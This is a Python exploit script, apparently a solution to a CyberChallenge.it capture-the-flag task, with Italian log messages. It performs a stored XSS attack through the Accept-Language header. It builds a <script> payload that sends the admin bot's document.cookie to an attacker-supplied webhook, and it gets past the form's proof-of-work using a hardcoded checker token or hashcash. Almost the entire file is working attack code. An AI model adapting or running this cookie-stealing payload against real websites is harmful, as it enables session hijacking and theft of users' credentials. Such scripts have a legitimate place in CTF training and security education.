import base64
import os
import re
import subprocess
import time
from urllib.parse import quote_plus

import requests


TARGET_URL = "http://super-php-i18n.challs.cyberchallenge.it/"
CHECKER_TOKEN = "supersecret"
EXFIL_URL = ""
POW_BITS = 26
TIMEOUT = 20


def now():
    return time.strftime("%H:%M:%S")


def log(msg: str):
    print(f"[{now()}] {msg}")


def section(title: str):
    print("\n" + "=" * 70)
    print(title)
    print("=" * 70)


def ask_exfil_url():
    if EXFIL_URL:
        return EXFIL_URL

    print("\nManca EXFIL_URL.")
    print("Inserisci un webhook per ricevere la cookie del bot admin.")
    print("Esempio: https://webhook.site/xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxx")
    value = input("EXFIL_URL: ").strip()
    if not value.startswith("http://") and not value.startswith("https://"):
        return ""
    return value


def extract_challenge(html: str):
    patterns = [
        r'hashcash -mCb26\s+"([a-f0-9]+)"',
        r'Proof of Work of\s+([a-f0-9]+)',
    ]
    for pattern in patterns:
        m = re.search(pattern, html, flags=re.IGNORECASE)
        if m:
            return m.group(1)
    return None


def solve_pow(resource: str, bits: int):
    cmd = ["hashcash", f"-mCb{bits}", resource]
    log(f"PoW: eseguo comando -> {' '.join(cmd)}")
    try:
        out = subprocess.run(cmd, capture_output=True, text=True, check=True)
        stamp = out.stdout.strip()
        if stamp:
            log("PoW: risolto con hashcash esterno")
            return stamp
    except FileNotFoundError:
        log("PoW: comando hashcash non trovato")
        log("Installa con: sudo apt install hashcash")
        log("In alternativa, usa il sito https://pow.cybersecnatlab.it/?data={resource}&bits={bits} " \
        "per calcolare il PoW manualmente")
    except subprocess.CalledProcessError as exc:
        log(f"PoW: hashcash ha fallito: {exc}")
        if exc.stderr:
            log(f"PoW stderr: {exc.stderr.strip()}")
        log("Verifica installazione e riprova: sudo apt install hashcash")

    return None


def build_payload(exfil_url: str, marker: str):
    sep = "&" if "?" in exfil_url else "?"
    js = (
        "(new Image()).src='"
        + exfil_url
        + sep
        + "m="
        + quote_plus(marker)
        + "&c='+encodeURIComponent(document.cookie)"
    )
    return f"<script>{js}</script>"


def send_message(session: requests.Session, pow_value: str, payload: str):
    data = {
        "name": "name",
        "email": "mail@gmail.com",
        "message": "mex",
        "pow": pow_value,
    }
    headers = {
        "Accept-Language": payload,
        "User-Agent": "Mozilla/5.0",
    }
    return session.post(TARGET_URL, data=data, headers=headers, timeout=TIMEOUT)


def queue_payload_once(session: requests.Session, payload: str):
    section("STEP 1/3 - GET home e challenge")
    r0 = session.get(TARGET_URL, timeout=TIMEOUT)
    r0.raise_for_status()
    challenge = extract_challenge(r0.text)
    log(f"Session cookie: {session.cookies.get_dict()}")
    log(f"Challenge: {challenge}")

    section("STEP 2/3 - Invio payload con CHECKER_TOKEN")
    r1 = send_message(session, CHECKER_TOKEN, payload)
    if "Message successfully sent!" in r1.text:
        log("Successo: CHECKER_TOKEN accettato")
        return True, "CHECKER_TOKEN"

    log("CHECKER_TOKEN rifiutato, provo PoW reale")
    challenge = extract_challenge(r1.text) or challenge
    if not challenge:
        log("Errore: non trovo challenge PoW nella risposta")
        return False, "NO_CHALLENGE"

    section("STEP 3/3 - Risolvo PoW e reinvio")
    stamp = solve_pow(challenge, POW_BITS)
    if not stamp:
        log("PoW fallita")
        return False, "POW_FAILED"

    log(f"Stamp usato: {stamp}")
    r2 = send_message(session, stamp, payload)
    if "Message successfully sent!" in r2.text:
        log("Messaggio accettato con PoW")
        return True, "POW"

    log(f"Invio rifiutato, status={r2.status_code}")
    return False, f"HTTP_{r2.status_code}"


def main():
    section("SUPER PHP I18N - EXPLOIT")
    print("Tecnica: stored XSS in language (header Accept-Language)")
    print("Obiettivo: far visitare al bot admin il payload e leggere flag da document.cookie")

    exfil_url = ask_exfil_url()
    if not exfil_url:
        log("EXFIL_URL non valida")
        return

    marker = base64.urlsafe_b64encode(os.urandom(6)).decode().rstrip("=")
    payload = build_payload(exfil_url, marker)

    section("CONFIG")
    log(f"Target: {TARGET_URL}")
    log(f"Exfil: {exfil_url}")
    log(f"Marker: {marker}")
    log(f"PoW bits: {POW_BITS}")
    log(f"Timeout: {TIMEOUT}s")
    log(f"Payload: {payload}")

    session = requests.Session()
    section("TENTATIVO 1/1")
    reason = "UNKNOWN"
    try:
        queued, reason = queue_payload_once(session, payload)
    except requests.RequestException as exc:
        log(f"Errore rete: {exc}")
        queued = False
        reason = "REQUEST_EXCEPTION"

    section("RISULTATO")
    if queued:
        log(f"Payload accodato al bot admin (via: {reason})")
        print("Controlla il webhook e cerca parametro c contenente flag=CCIT{...}")
        return

    log(f"Payload non accodato (motivo: {reason})")
    print("Suggerimenti rapidi:")
    print("- verifica hashcash e challenge")
    print("- aumenta TIMEOUT se la rete e lenta")
    print("- verifica EXFIL_URL")


if __name__ == "__main__":
    main()
